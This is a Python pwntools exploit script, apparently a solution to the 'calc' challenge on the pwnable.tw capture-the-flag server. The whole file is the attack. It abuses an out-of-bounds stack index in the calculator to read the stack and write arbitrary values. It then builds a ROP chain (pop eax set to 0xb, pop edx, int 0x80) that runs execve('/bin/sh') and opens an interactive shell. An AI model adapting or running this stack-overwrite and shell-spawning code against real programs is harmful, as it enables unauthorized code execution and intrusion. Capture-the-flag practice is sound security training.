from pwn import *

server = remote('chall.pwnable.tw', 10100)

def read_stack_val(offset):
    #get current value on stack
    server.sendline('+' + str(offset))
    current_val = int(server.read()[0:-1])
    return current_val

def push_on_stack(value):
    current_val = read_stack_val(push_on_stack.counter) #get currnet addr for abitrary write
    val_to_add = current_val - value
    
    if(val_to_add > 0):
        #add the difference between addr and current location
        payload = '+' + str(push_on_stack.counter) + '-' + str(val_to_add) + '\n' 
    else:
        #adding to current addr bytes needed to reach gadget addr
        payload = '+' + str(push_on_stack.counter) + '+' + str(-1*val_to_add) + '\n' 
    server.send(payload)
    ret_addr_calc = int(server.read()[0:-1])
    push_on_stack.counter += 1
    
push_on_stack.counter = 361
print(server.recv())

stack_addr = read_stack_val(360)
addr_pop_eax = 0x0805c34b
addr_int_80 = 0x08049a21
addr_pop_edx = 0x080701d0

push_on_stack(addr_pop_eax)
push_on_stack(0x0000000b)
push_on_stack(addr_pop_edx)
push_on_stack(0x00000000)
push_on_stack(0x00000000)
push_on_stack(stack_addr)
push_on_stack(addr_int_80)

push_on_stack(0x6e69622f) #/bin
push_on_stack(0x0068732f) #/sh\x00
push_on_stack(0x00000000)

server.send('\n') #abort
server.interactive()
